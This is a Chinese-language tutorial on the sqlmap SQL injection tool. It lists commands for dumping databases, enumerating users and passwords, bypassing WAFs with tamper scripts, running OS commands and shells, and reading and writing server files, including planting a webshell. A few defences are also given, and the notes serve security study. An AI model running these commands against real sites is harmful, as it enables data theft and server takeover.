SQLmap笔记

SQLmap

SQLmap的介绍

sqlmap是一个开源的渗透测试工具，它自动化了检测和利用SQL注入缺陷以及接管数据库服务器的过程

SQLmap支持六种注入方式

SQL盲注、联合注入、报错注入、堆叠注入、盲推理注入、时间盲注

使用SQLmap得出数据库信息的基本流程

1.检查是否存在注入点

sqlmap -u “URL”

参数：-u #目标URL

2.查看所有数据库

sqlmap -u “URL” –dbs

参数：-u #目标URL、–dbs #所有数据库

3.查看当前使用的数据库

sqlmap -u “URL” –current-db

参数：-u #目标URL、–current-db #查看网站当前的数据库

4.查看表名

sqlmap -u “URL” -D security –tables

参数：-u #目标URL、-D #指定数据库、–tables #列出表名

5.列出所有字段名

sqlmap -u “URL” -D security -T users –columns

参数：-u#目标URL、-D #指定数据库、-T #指定表名、–columns #列出所有的字段名

6.列出字段内容（数据）

参数：-u#目标URL、-D #指定数据库、-T #指定表名、-C #指定字段、–dump #列出字段内容，转存数据

SQLmap常用参数

输出级别参数

参数：-v

使用方法：-v <级别> 如：sqlmap -u “URL” -v 3

参数详情：SQLmap的输出信息从简到繁，从0-6共分为7个级别，默认输出级别为1

各个输出级别的描述如下：

0：只显示python的回溯、错误和关键信息

1:显示信息和警告消息

2∶显示调式信息

3∶显示注入使用的攻击载荷

4∶显示HTTP请求

5∶显示HTTP响应头

6∶显示HTTP相应页面的内容

测试注入点权限

参数：–privileges

用法：

sqlmap -u URL –privileges //测试所有用户的权限

sqlmap -u URL –privileges -U sa //测试sa用户的权限

注：若目标是MSSql数据库、这一参数会列出每个用户是否是管理员而不列出每个用户的具体权限

执行shell命令

参数：-os-cmd/-os-shell

用法：

sqlmap -u URL –os-cmd=“net user” //执行net user命令

sqlmap -u URL –os-shell //系统交互式的shell

注：

1.需要有权限使用特定函数

2.数据库为mysql、postgresql和sqlserver

POST提交方式

参数：

1.-data //通过post方式提交参数

2.-r txt文件 //读取文件中的HTTP数据包内容用来测试POST注入和HTTP Header注入

用法：

sqlmap -u URL –data “POST参数”

sqlmap -u URL -r “.TXT文件”

获取数据库的用户名和密码

参数：

1.-users //枚举所有的用户

2.-passwords //枚举所有的用户密码

用法：

sqlmap -u URL –users -passwords

tamper参数

作用：

·tamper则是对其进行扩展的一系列脚本，主要功能是对本来的payload进行特定的更改以绕过waf

·使用SQLMap提供的tamper脚本，可在一定程度上避开应用程序的敏感字符过滤、绕过WAF规则的阻挡，继而进行渗透攻击

用法：

sqlmap -u URL –tamper=TAMPER //利用给定的脚本进行篡改注入数据

SQLmap深入理解

探测等级

参数：–level

用法：sqlmap -u URL –level 3

说明:SQLMap一共有5个探测等级，默认是1，SQLMap使用的Payload可以在xml/payloads.xml中看到，也可以根据相应的格式添加自己的payload。

level 1 : 对GET和POST的数据进行测试

level 2:会对HTTP cookie进行测试

level 3:会对HTTP User-Agent/Referer头进行测试

level4-5:测试的更加全面，同时测试的速度会更慢

注意∶在不确定哪个Payload或参数为注入点时，为了保证全面性，建议使用高的level值

判断当前用户是否为管理员权限

参数：–is-dba

用法：sqlmap -u URL –is-dba

结果：若是管理员会返回Ture，否则返回False

列出数据库管理员角色

参数：–roles

用法：sqlmap -u URL –roles

注：还可以使用-U参数指定想看哪个用户的角色

列举数据库管理系统信息

参数：-b或–banner

用法：sqlmap -u URL –banner

说明:返回数据库管理系统的版本号和最后的补丁级别以及底层的操作系统信息

SQLmap的HTTP头部注入

HTTP方法

参数：-method

用法：sqlmap -u URL -method “PUT”

注：一般来说，Sqlmap能自动判断出是使用GET方法还是POST方法，但在某些情况下需要的可能是PUT等很少见的方法，此时就需要用参数“-method”来指定方法

cookie注入

参数：–cookie

用法：sqlmap -u URL –cookie=“SESSIONID=xxxxx;NAME=ichunqiu;” –level 2 –data “”

注︰当需要对cookie注入的时候，必须使用–cookie选项,–data “”因为post的数据长度为0，但是又想使用post方法进行注入，则使用–data “”，使用–data选项后，sqlmap自动使用post方法

说明∶
1.sqlmap不支持使用–method指定http请求的方法

2.默认不扫cookie的内容，必须是level大于等于2才能扫cookie里的内容

3.cookie默认的分隔符为“;”

User-Agent注入

参数：-user-agent和-random-agent

用法:–user-agent=”Mozilla/5.0 (Windows NT 6.1; WOW64; rv:16.0) Gecko/20100101 Firefox/16.0”

注:”-user-agent”可以指定一个User-Agent值，参数“-random-agent”，Sqlmap会从文件./txt/user-agents.txt中随机地取一个User-Agent

说明：

1.在一次会话中只有使用同一个User-Agent，并不是每发一个HTTP请求包，都随机一个User-Agent

2.必须是level大于等于3才会尝试对referer,注入

Referer注入

参数：-referer

用法：-referer=“aaa”

说明：使用sqlmap可以在请求中伪造HTTP中的referer ，Sqlmap发送的HTTP请求头部默认无Referer字段

注意∶必须是level大于等于3才会尝试对 referer注入

SQLmap执行SQL语句

交互式的SQL命令行

参数：–sql-shell

用法：sqlmap -u URL –sql-shell

注：该参数可直接获得交互式的SQL命令shell，我们可以在此直接输入想要执行的SQL语句并实时取得回显，输入x或者q退出交互式命令行

执行指定SQL语句

参数：–sql-query

用法：sqlmap -u URL –sql-query=“sql语句” sqlmap.py -u “http://10.1.1.136/vulnerabilities/sqli/?id=1 –sql-query “select user(),version(),database()”

说明：该命令直接执行指定的SQL语句

注：执行一次都会对网站注入一遍，比–sql-shell效率低

SQLmap的文件操作

了解SQL注入可以进行文件读写操作带来的危害

如果当前web页面存在SQL注入漏洞，且当前的用户是root权限，且可以进行文件读写操作

我们可以在知道绝对路径的情况下，尝试上传一个一句话木马，并用菜刀连接后，获取到网站的getshell

SQL注入导致的文件读写的防御方法

1.将secure-file-priv的参数在my.ini中配置为secure-file-priv=null将会限制mysqld不允许导入导出操作secure-file-priv的配置，可以通过语句: select @@secure..file.priv查询

2．在用户输入可控参数时，对敏感语句进行过滤

读取文件

参数:–file-read

用法: sqlmap -u URL –file-read “文件绝对路径”

说明:该命令用于读取执行文件，读取的文件可以是文本，也可以是二进制文件原理:利用mysql的load_file函数如:load_file(‘c:/windows/win.ini’)

条件:

文件必须在服务器上

已知绝对路径

具有读文件权限查询语句[select File_priv from mysqL.user where user=”root” and host=”localhost”]

具有特定的函数执行特权，一般要求root

数据库为mysql、postgresql和sqlserver

max_allowed_packed //读写文件最大的字节数

上传文件

参数:–file-write –file-dest

用法:sqlmap -u URL –file-write “写入本地文件的地址”–file-dest “要写入的文件绝对路径”

说明：该命令用于写入本地文件到服务器中，上传的文件可以是文本，也可以是二进制文件

原理︰利用mysql的into outfile函数 如: union select 1,2, ‘aaa’ into outfile ‘C:\\phpstudy_pro\\www\\test1.txt’

条件:

1.文件必须在服务器上

2.已知绝对路径

3.有写文件权限（secure-file-priv是否被禁用，是否有目录权限等等）

4.必须能绕过单引号过滤

5.具有特定的函数执行特权，一般要求root

6.数据库为mysql、postgresql和sqlserver
